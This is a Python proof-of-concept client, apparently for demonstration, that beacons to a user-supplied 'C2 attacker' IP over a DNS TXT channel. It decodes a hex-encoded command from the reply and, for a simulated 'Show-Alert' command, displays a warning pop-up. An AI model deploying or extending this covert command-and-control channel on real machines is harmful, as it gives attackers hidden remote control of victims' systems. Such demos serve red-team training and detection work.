import socket
import argparse
import logging
import tkinter as tk
from tkinter import messagebox
from scapy.all import DNS, DNSQR

logging.basicConfig(
    level=logging.INFO, 
    format='[%(asctime)s] [%(levelname)s] %(message)s', 
    datefmt='%Y-%m-%d %H:%M:%S'
)

BANNER = """
 ____  _   _ ____    _   _ _      _   _           
|  _ \\| \\ | / ___|  | | | (_) ___| |_(_)_ __ ___  
| | | |  \\| \\___ \\  | | | | |/ __| __| | '_ ` _ \\ 
| |_| | |\\  |___) | | |_| | | (__| |_| | | | | | |
|____/|_| \\_|____/   \\___/|_|\\___|\\__|_|_| |_| |_|
       -- DNS Tunneling PoC Client --
"""

def mostrar_alerta_visual(mensaje):
    root = tk.Tk()
    root.withdraw()
    messagebox.showwarning("¡Alerta Crítica de Seguridad!", mensaje)
    root.destroy()

def llamar_al_c2(ip_atacante, puerto, dominio):
    print(BANNER)
    logging.info(f"Iniciando beaconing hacia C2 ({ip_atacante}:{puerto}) vía DNS nativo...")
    
    peticion_dns = DNS(rd=1, qd=DNSQR(qname=dominio, qtype="TXT"))
    datos_crudos = bytes(peticion_dns)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        sock.sendto(datos_crudos, (ip_atacante, puerto))
        
        datos_respuesta, _ = sock.recvfrom(1024)
        respuesta = DNS(datos_respuesta)
        
        if respuesta.ancount > 0:
            rdata = respuesta.an.rdata
            if isinstance(rdata, list):
                rdata = rdata[0]
                
            payload_hex = rdata.decode('utf-8')
            comando = bytes.fromhex(payload_hex).decode('utf-8')
            logging.info(f"Respuesta recibida y decodificada exitosamente: {comando}")
            
            if comando.startswith("CMD_SIM:Show-Alert:"):
                mensaje_alerta = comando.split(":", 2)[2].replace("_", " ")
                logging.warning(f"Ejecutando orden visual del C2...")
                mostrar_alerta_visual(mensaje_alerta)
                
    except socket.timeout:
        logging.error("Sin respuesta del servidor C2. Tiempo de espera agotado.")
    except Exception as e:
        logging.error(f"Error de conexión: {e}")

if __name__ == "__main__":
    # La IP ya no está dentro del código, se pasa como parámetro obligatorio (-t)
    parser = argparse.ArgumentParser(description="DNS Tunneling Stager PoC")
    parser.add_argument("-t", "--target", required=True, help="IP del servidor C2 Atacante")
    parser.add_argument("-p", "--port", type=int, default=9000, help="Puerto UDP del servidor (default: 9000)")
    parser.add_argument("-d", "--domain", default="beacon.falso.local", help="Dominio de beaconing (default: beacon.falso.local)")
    
    args = parser.parse_args()
    llamar_al_c2(args.target, args.port, args.domain)